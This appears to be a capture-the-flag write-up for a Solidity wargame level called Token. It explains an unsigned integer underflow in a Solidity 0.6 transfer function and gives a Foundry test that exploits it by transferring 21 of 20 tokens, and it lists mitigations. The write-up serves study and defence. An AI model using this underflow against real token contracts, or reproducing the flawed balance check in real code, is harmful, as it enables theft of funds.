# 05. Token

[English](05_Token.md) | [한국어](../ko/05_Token.md)

## Objective

Increase the player's token balance beyond the 20 tokens initially provided by the level.

## Key Concepts

- Unsigned integer underflow
- Unchecked arithmetic in Solidity 0.6
- Modular arithmetic
- Checks before state changes
- Multi-version testing with `deployCode()`

## Contract Analysis

The transfer function attempts to reject transfers that exceed the caller's balance:

```solidity
function transfer(address _to, uint256 _value) public returns (bool) {
    require(balances[msg.sender] - _value >= 0);
    balances[msg.sender] -= _value;
    balances[_to] += _value;
    return true;
}
```

The check does not work as intended. `balances[msg.sender]` and `_value` are both `uint256`, so their subtraction also produces a `uint256`. An unsigned integer cannot represent a negative number and is therefore always greater than or equal to zero.

In Solidity 0.6, arithmetic does not automatically revert on overflow or underflow. Instead, the value wraps modulo `2^256`.

## Underflow Calculation

The player begins with 20 tokens and attempts to transfer 21:

```text
20 - 21
= -1 mod 2^256
= 2^256 - 1
= 115792089237316195423570985008687907853269984665640564039457584007913129639935
```

The same wrapped result is evaluated inside the `require` statement. Because it is a very large positive `uint256`, the condition passes. The following subtraction wraps in the same way and stores the maximum `uint256` value as the player's balance.

The recipient must be a different address. Sending the tokens back to the player would subtract and then add to the same mapping entry, returning the balance to its original value.

## Solution Flow

```text
Player balance = 20
        ↓
Player transfers 21 tokens to a separate receiver
        ↓
The require expression evaluates a wrapped uint256 value
        ↓
The sender's subtraction wraps to 2^256 - 1
        ↓
Receiver balance = 21
Player balance = type(uint256).max
```

No intermediary solver contract is required because the player can call `transfer()` directly.

## Foundry Test

The vulnerable target uses Solidity 0.6, while the current Forge Standard Library requires Solidity 0.8. Importing both into one compilation unit would create incompatible pragma requirements.

The test therefore declares only the target's ABI:

```solidity
interface IToken {
    function transfer(address to, uint256 value) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}
```

Forge compiles the legacy source separately. `deployCode()` then loads its creation bytecode and appends the ABI-encoded constructor argument:

```solidity
target = IToken(
    deployCode("05_Token.sol:Token", abi.encode(uint256(100)))
);
```

Because `deployCode()` creates the target from the test contract, the test contract receives the initial supply. During `setUp()`, it transfers 20 tokens to the player to reproduce the level's starting condition.

The solution test impersonates the player for one call:

```solidity
vm.prank(player);
bool transferred = target.transfer(receiver, 21);

assertTrue(transferred);
assertEq(target.balanceOf(receiver), 21);
assertEq(target.balanceOf(player), type(uint256).max);
```

## Test Flow

```text
Deploy the Solidity 0.6 Token artifact with a supply of 100
        ↓
Transfer 20 tokens from the test contract to the player
        ↓
Prank the next call as the player
        ↓
Transfer 21 tokens to a separate receiver
        ↓
Verify the receiver owns 21 tokens
        ↓
Verify the player balance equals type(uint256).max
```

## Root Cause

The contract checks the result of a potentially unsafe subtraction instead of checking the operands before subtracting. In an unchecked arithmetic environment, the subtraction has already wrapped by the time the comparison is evaluated.

This condition:

```solidity
require(balances[msg.sender] - _value >= 0);
```

should express the actual invariant directly: the sender's current balance must be greater than or equal to the requested transfer amount.

## Recommended Mitigations

- Check `balances[msg.sender] >= _value` before subtracting.
- Use Solidity 0.8 or later, where arithmetic overflow and underflow revert by default.
- For older compiler versions, use a checked arithmetic library such as OpenZeppelin `SafeMath`.
- Keep validation conditions focused on the operands rather than an already-computed unsafe result.
- Test zero balances, exact-balance transfers, and transfers one unit above the available balance.

With Solidity 0.8, the original subtraction would revert with an arithmetic panic before the Boolean comparison could complete. An explicit balance check is still preferable because it communicates the intended rule and can provide a meaningful error.

## Run the Test

```bash
forge test --match-path test/05_Token.t.sol -vvv
```

To inspect the complete call trace:

```bash
forge test --match-path test/05_Token.t.sol -vvvv
```

## Takeaway

An unsigned value being greater than or equal to zero is not a useful balance check. Validate that the balance is at least the transfer amount before subtraction, and remember that arithmetic behavior depends on the Solidity compiler version.
